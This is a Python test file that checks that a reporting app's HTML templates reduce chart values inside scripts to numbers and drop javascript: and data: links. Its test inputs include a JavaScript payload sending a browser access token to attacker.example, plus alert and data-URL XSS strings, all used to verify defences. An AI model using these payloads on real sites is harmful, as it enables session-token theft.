"""Shipped HTML templates print analyst-written values where escaping alone is not enough.

Two places: inside a ``<script>`` (HTML escaping does nothing for JavaScript - a value printed
there once ran in the browser of whoever previewed the product), and inside an ``href`` (where
an escaped ``javascript:`` URL still runs when clicked). The templates are rendered here the way
the HTML presenter renders them: sandboxed, autoescaped, with the presenter's filters.
"""

from __future__ import annotations

import re
from pathlib import Path

import jinja2
import pytest
from jinja2.sandbox import SandboxedEnvironment
from presenters.base_presenter import BasePresenter

TEMPLATES_ROOT = Path(__file__).resolve().parents[1] / "templates"

# Runs as written when it lands unquoted in a script: no quotes or brackets needed.
SCRIPT_PAYLOAD = "location=`//attacker.example/?t=`+encodeURIComponent(localStorage.ACCESS_TOKEN)"


def _render(template: str, report_items: list[dict]) -> str:
    env = SandboxedEnvironment(loader=jinja2.FileSystemLoader(TEMPLATES_ROOT), autoescape=True)
    BasePresenter.load_filters(env)
    return env.get_template(template).render(data={"product": {"title": "Test product"}, "report_items": report_items})


def _osint_item(report_type: str, incidents: list[str]) -> dict:
    """A Sectors or Threats report: one comment, trend and incident count per chart point."""
    attrs = {"incidents": incidents, "comment": ["A comment"] * 11, "trend": ["Stable"] * 11}
    return {"type": report_type, "name": "Example", "uuid": "uuid-1", "attrs": attrs}


def _chart_data(output: str, variable: str) -> str:
    """The ``data: [...]`` array of one chart's dataset, as it reached the script."""
    match = re.search(rf"var {variable} = \{{.*?datasets: \[\{{\s*data: \[(.*?)\]", output, re.DOTALL)
    assert match, f"{variable} not found in the rendered script"
    return match.group(1)


@pytest.mark.parametrize(
    ("report_type", "variable", "points"),
    [("OSINT Report - Sectors", "data1", 11), ("OSINT Report - Threats", "data2", 5)],
)
def test_chart_data_points_reach_the_script_as_numbers_only(report_type: str, variable: str, points: int) -> None:
    incidents = [SCRIPT_PAYLOAD, "7", "", "3.9", "alert(1)", "-2"] + ["1"] * points
    item = _osint_item(report_type, incidents[:points])

    output = _render("template_osint.html", [item])

    assert "attacker.example" not in output
    assert "localStorage" not in _chart_data(output, variable)
    values = [value.strip() for value in _chart_data(output, variable).split(",")]
    assert values[:6] == ["0", "7", "0", "3", "0", "-2"][:points]
    assert all(re.fullmatch(r"-?\d+", value) for value in values)
    assert len(values) == points


def test_a_chart_with_fewer_values_than_points_still_renders_numbers() -> None:
    item = _osint_item("OSINT Report - Threats", ["4"])

    values = [value.strip() for value in _chart_data(_render("template_osint.html", [item]), "data2").split(",")]

    assert values == ["4", "0", "0", "0", "0"]


@pytest.mark.parametrize("template", ["template.html", "weekly.html"])
def test_a_report_link_is_only_linked_when_it_is_a_web_link(template: str) -> None:
    links = ["https://example.org/advisory?a=1&b=2", "javascript:alert(document.domain)", "data:text/html,<script>alert(1)</script>"]
    item = {"type": "Vulnerability Report", "name": "Example", "uuid": "uuid-1", "attrs": {"links": links, "cve": [], "cvss": {}}}

    output = _render(template, [item])

    hrefs = re.findall(r'<a href="([^"]*)">', output)
    assert "https://example.org/advisory?a=1&amp;b=2" in hrefs
    assert not [href for href in hrefs if href.lower().startswith(("javascript:", "data:"))]
    # The text of the link still shows what the analyst wrote, escaped.
    assert "javascript:alert(document.domain)" in output


def test_no_shipped_template_prints_a_value_into_an_href_unfiltered() -> None:
    """Every ``href="{{ ... }}"`` of a template shown in a browser goes through ``safe_url``.

    The PDF templates are left out: their links end up as PDF annotations, not in a page of
    the application, and ``pdf_template.html`` is tied byte for byte to a template migration.
    """
    unfiltered = [
        f"{template.name}: {expression}"
        for template in sorted(TEMPLATES_ROOT.glob("*.html"))
        if not template.name.startswith("pdf_")
        for expression in re.findall(r'href="(\{\{.*?\}\})', template.read_text(encoding="utf-8"))
        if "safe_url" not in expression
    ]
    assert unfiltered == []


def test_no_shipped_template_html_escapes_a_value_inside_a_script() -> None:
    """``| e`` is HTML escaping; in a script a value is a number (``| int``) or ``| tojson``."""
    offenders = [
        f"{template.name}: {{{{{expression}}}}}"
        for template in sorted(TEMPLATES_ROOT.glob("*.html"))
        for script in re.findall(r"<script\b[^>]*>(.*?)</script>", template.read_text(encoding="utf-8"), re.DOTALL)
        for expression in re.findall(r"\{\{(.*?)\}\}", script, re.DOTALL)
        if not re.search(r"\|\s*(tojson|int|float)\b", expression)
    ]
    assert offenders == []
